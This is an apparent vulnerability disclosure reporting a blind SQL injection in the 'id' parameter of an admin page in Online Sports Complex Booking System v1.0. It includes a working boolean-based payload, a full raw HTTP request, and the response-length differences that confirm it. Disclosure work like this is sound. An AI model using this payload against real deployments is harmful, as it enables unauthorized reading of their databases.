# Online Sports Complex Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15236/online-sports-complex-booking-system-phpmysql-free-source-code.html

Vulnerability File: /scbs/admin/categories/view_category.php?id=

Vulnerability location: /scbs/admin/categories/view_category.php?id=, id

Current database name: scbs_db,length is 7

[+] Payload: /scbs/admin/categories/view_category.php?id=2%27%20and%20length(database())%20=7%20--+

```sql
GET /scbs/admin/categories/view_category.php?id=2%27%20and%20length(database())%20=7%20--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=gp584rjk4ugbjakmto03cu7pco
Connection: close

// Leak place ---> id
```

When length (database ()) = 6, Content-Length: 873
![image](https://user-images.githubusercontent.com/54017627/165214816-bc585a48-329c-4c58-942c-7fe008932407.png)

![image](https://user-images.githubusercontent.com/54017627/165214739-bacc0fc3-f191-4f8a-9673-aff0155422f5.png)

When length (database ()) = 7, Content-Length: 775
![image](https://user-images.githubusercontent.com/54017627/165214791-3fc98669-5b38-4240-8033-78b2cf94446a.png)

![image](https://user-images.githubusercontent.com/54017627/165214689-4cb5a17b-aa17-4f4c-a837-217973dcb13f.png)
